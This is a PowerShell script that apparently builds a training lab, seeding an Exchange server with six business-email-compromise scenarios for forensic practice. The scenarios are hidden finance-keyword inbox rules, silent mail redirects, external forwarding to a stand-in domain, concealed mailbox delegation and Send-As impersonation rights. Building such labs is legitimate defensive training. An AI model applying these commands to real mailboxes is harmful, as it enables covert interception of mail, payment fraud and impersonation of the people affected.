# 05-setup-exchange-mailboxes-bec.ps1
# Run on SRV01 (the-eyrie) as Domain Admin
# Enables mailboxes for all new users and sets up BEC scenarios

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn -ErrorAction SilentlyContinue

# ================================================================
# ENABLE MAILBOXES FOR ALL NEW USERS
# ================================================================
Write-Host "=== Enabling Mailboxes ===" -ForegroundColor Cyan

$excludedUsers = @("administrator", "ansible", "goadmin", "vagrant", "krbtgt", "Guest")
$users = Get-User -RecipientTypeDetails User -ResultSize Unlimited | Where-Object {
    $_.RecipientTypeDetails -ne 'MailboxUser' -and
    $excludedUsers -notcontains $_.SamAccountName -and
    -not $_.SamAccountName.EndsWith('$')
}

$count = 0
foreach ($user in $users) {
    try {
        Enable-Mailbox -Identity $user.SamAccountName
        Set-MailboxRegionalConfiguration -Identity $user.SamAccountName -Language en-US -TimeZone "Romance Standard Time" -ErrorAction SilentlyContinue
        Write-Host "[+] Mailbox enabled: $($user.SamAccountName)" -ForegroundColor Green
        $count++
    } catch {
        Write-Host "[!] Mailbox failed: $($user.SamAccountName) - $_" -ForegroundColor Red
    }
}
Write-Host "[*] Enabled $count new mailboxes`n" -ForegroundColor Cyan

# Give Exchange time to provision mailboxes
Start-Sleep -Seconds 30

# ================================================================
# BEC SCENARIO 1: Executive Mail Forwarding (Internal)
# Doran Martell (Prince of Dorne) has mail forwarded to Ellaria Sand
# Simulates: compromised assistant reading exec mail
# ================================================================
Write-Host "=== BEC Scenario 1: Executive Mail Forwarding ===" -ForegroundColor Cyan
try {
    Set-Mailbox -Identity "doran.martell" -ForwardingAddress "ellaria.sand" -DeliverToMailboxAndForward $true
    Write-Host "[+] doran.martell mail forwarded to ellaria.sand (internal)" -ForegroundColor Green
} catch {
    Write-Host "[!] BEC1 failed: $_" -ForegroundColor Red
}

# ================================================================
# BEC SCENARIO 2: Hidden Inbox Rule Forwarding
# Olenna Tyrell has an inbox rule forwarding emails containing
# "payment", "invoice", "wire" to an external address
# Simulates: attacker-created inbox rule for financial interception
# ================================================================
Write-Host "`n=== BEC Scenario 2: Hidden Inbox Rule ===" -ForegroundColor Cyan
try {
    New-InboxRule -Mailbox "olenna.tyrell" `
        -Name "Archive Finance" `
        -SubjectContainsWords @("payment","invoice","wire","transfer","bank","budget") `
        -ForwardTo "walder.frey" `
        -MarkAsRead $true `
        -StopProcessingRules $false
    Write-Host "[+] olenna.tyrell inbox rule: finance keywords forwarded to walder.frey" -ForegroundColor Green
} catch {
    Write-Host "[!] BEC2 failed: $_" -ForegroundColor Red
}

# ================================================================
# BEC SCENARIO 3: altRecipient — Mail Redirect
# Mace Tyrell (Lord of Highgarden) has altRecipient set to margaery.tyrell
# All mail to mace goes to margaery instead (he never sees it)
# Simulates: full mail redirect/interception
# ================================================================
Write-Host "`n=== BEC Scenario 3: altRecipient Redirect ===" -ForegroundColor Cyan
try {
    Set-Mailbox -Identity "mace.tyrell" -ForwardingAddress "margaery.tyrell" -DeliverToMailboxAndForward $false
    Write-Host "[+] mace.tyrell ALL mail redirected to margaery.tyrell (mace never sees it)" -ForegroundColor Green
} catch {
    Write-Host "[!] BEC3 failed: $_" -ForegroundColor Red
}

# ================================================================
# BEC SCENARIO 4: External SMTP Forwarding
# Walder Frey forwards a copy of all mail to an external address
# Simulates: data exfiltration via external forwarding
# ================================================================
Write-Host "`n=== BEC Scenario 4: External SMTP Forward ===" -ForegroundColor Cyan
try {
    Set-Mailbox -Identity "walder.frey" -ForwardingSMTPAddress "walder.frey@external-twins.com" -DeliverToMailboxAndForward $true
    Write-Host "[+] walder.frey copies all mail to walder.frey@external-twins.com" -ForegroundColor Green
} catch {
    Write-Host "[!] BEC4 failed: $_" -ForegroundColor Red
}

# ================================================================
# BEC SCENARIO 5: Delegate Access (Full Mailbox Access)
# Euron Greyjoy has FullAccess to balon.greyjoy's mailbox
# Simulates: mailbox delegation abuse
# ================================================================
Write-Host "`n=== BEC Scenario 5: Mailbox Delegation ===" -ForegroundColor Cyan
try {
    Add-MailboxPermission -Identity "balon.greyjoy" -User "euron.greyjoy" -AccessRights FullAccess -AutoMapping $false
    Write-Host "[+] euron.greyjoy has FullAccess to balon.greyjoy mailbox (AutoMapping off = hidden)" -ForegroundColor Green
} catch {
    Write-Host "[!] BEC5 failed: $_" -ForegroundColor Red
}

# ================================================================
# BEC SCENARIO 6: Send-As Permission
# Ramsay Bolton can send email as roose.bolton
# Simulates: impersonation via send-as
# ================================================================
Write-Host "`n=== BEC Scenario 6: Send-As Impersonation ===" -ForegroundColor Cyan
try {
    Add-ADPermission -Identity "roose.bolton" -User "NORTH\ramsay.bolton" -AccessRights ExtendedRight -ExtendedRights "Send As"
    Write-Host "[+] ramsay.bolton can Send-As roose.bolton" -ForegroundColor Green
} catch {
    Write-Host "[!] BEC6 failed: $_" -ForegroundColor Red
}

# ================================================================
# SEND TEST EMAILS (populate mailboxes for forensics)
# ================================================================
Write-Host "`n=== Sending seed emails to populate mailboxes ===" -ForegroundColor Cyan

$emails = @(
    @{ From="cersei.lannister@sevenkingdoms.local";   To="doran.martell@sevenkingdoms.local";   Subject="RE: Alliance Terms";              Body="Doran, the terms are acceptable. Proceed with the arrangement. -Cersei" }
    @{ From="olenna.tyrell@sevenkingdoms.local";      To="mace.tyrell@sevenkingdoms.local";     Subject="Q4 Budget wire transfer approval"; Body="Mace, approve the wire transfer of 50,000 gold dragons to the Iron Bank. Account: IB-2024-8891. -Mother" }
    @{ From="davos.seaworth@sevenkingdoms.local";     To="stannis.baratheon@sevenkingdoms.local"; Subject="Invoice from Iron Bank";          Body="My Lord, attached is the invoice from the Iron Bank. Payment due in 30 days. Regards, Davos" }
    @{ From="tywin.lannister@sevenkingdoms.local";    To="cersei.lannister@sevenkingdoms.local"; Subject="RE: Payroll access";               Body="Cersei, I have granted the new payroll access as requested. The password is in the HR share. -Father" }
    @{ From="walder.frey@sevenkingdoms.local";        To="lothar.frey@sevenkingdoms.local";     Subject="Wedding arrangements";             Body="Lothar, ensure the musicians are briefed. The Rains of Castamere. -Father" }
    @{ From="olenna.tyrell@sevenkingdoms.local";      To="margaery.tyrell@sevenkingdoms.local";  Subject="RE: Payment schedule";             Body="Margaery, the payment schedule for next quarter is attached. Keep this between us." }
    @{ From="edmure.tully@sevenkingdoms.local";       To="brynden.tully@sevenkingdoms.local";   Subject="Riverrun defences";                Body="Uncle, the garrison is at half strength. We need reinforcements from the Reach." }
    @{ From="balon.greyjoy@sevenkingdoms.local";      To="yara.greyjoy@sevenkingdoms.local";    Subject="Fleet orders";                     Body="Yara, take 30 ships and raid the Stony Shore. The dock codes are PYKE-2024-IRON. -Father" }
)

foreach ($e in $emails) {
    try {
        Send-MailMessage -From $e.From -To $e.To -Subject $e.Subject -Body $e.Body -SmtpServer "localhost" -ErrorAction Stop
        Write-Host "[+] Email sent: $($e.From) -> $($e.To) [$($e.Subject)]" -ForegroundColor Green
    } catch {
        Write-Host "[!] Email failed: $($e.From) -> $($e.To) - $_" -ForegroundColor Yellow
    }
}

Write-Host "`n=== BEC Summary ===" -ForegroundColor Cyan
Write-Host "Scenario 1: doran.martell -> forwarded to ellaria.sand (exec forwarding)"
Write-Host "Scenario 2: olenna.tyrell -> inbox rule forwards finance keywords to walder.frey"
Write-Host "Scenario 3: mace.tyrell -> ALL mail redirected to margaery.tyrell (altRecipient)"
Write-Host "Scenario 4: walder.frey -> copies to external address (data exfil)"
Write-Host "Scenario 5: euron.greyjoy -> FullAccess to balon.greyjoy mailbox (hidden delegate)"
Write-Host "Scenario 6: ramsay.bolton -> Send-As roose.bolton (impersonation)"
Write-Host "`n[*] Exchange expansion and BEC scenarios complete." -ForegroundColor Cyan
